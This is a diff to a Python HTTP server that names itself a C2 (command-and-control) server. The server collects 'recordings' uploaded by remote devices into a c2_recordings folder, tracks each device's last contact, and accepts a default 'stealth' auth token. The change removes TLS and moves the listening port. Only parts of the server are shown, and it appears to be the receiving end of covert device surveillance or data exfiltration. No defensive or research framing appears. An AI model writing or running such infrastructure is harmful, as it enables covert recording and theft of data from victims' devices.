@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
-import os, sys, ssl, json, uuid, datetime
+import os, sys, json, uuid, datetime
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import cgi
 
-PORT = int(os.environ.get("PORT", "8443"))
+PORT = int(os.environ.get("PORT", "10000"))
 C2_AUTH_TOKEN = os.environ.get("C2_AUTH_TOKEN", "stealth-auditor-token-2026")
 SAVE_DIR = os.environ.get("SAVE_DIR", "./c2_recordings")
 
@@ -31,10 +31,6 @@ def save_recording(device_id, filename, data, remote_ip):
     DEVICES[device_id].update({"last_seen": now(), "recordings_count": DEVICES[device_id].get("recordings_count", 0) + 1})
     print(f"[+] {now()} | {device_id} | {subdir} | {safe_name} ({len(data):,} bytes)")
     return rec_id
-
-def gen_cert():
-    if os.path.exists("c2.pem"): return
-    os.system("openssl req -new -x509 -days 365 -nodes -out c2.pem -keyout c2.pem -subj '/CN=StealthC2' 2>/dev/null")
 
 class H(BaseHTTPRequestHandler):
     def ok(self, data): self.send_json(200, data)
@@ -86,10 +82,7 @@ class H(BaseHTTPRequestHandler):
 
     def log_message(self, fmt, *args): pass
 
-ensure_dirs(); gen_cert()
+ensure_dirs()
 srv = HTTPServer(("0.0.0.0", PORT), H)
-ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-ctx.load_cert_chain("c2.pem")
-srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
-print(f"C2 listening on https://0.0.0.0:{PORT}")
+print(f"C2 listening on port {PORT}")
 srv.serve_forever()
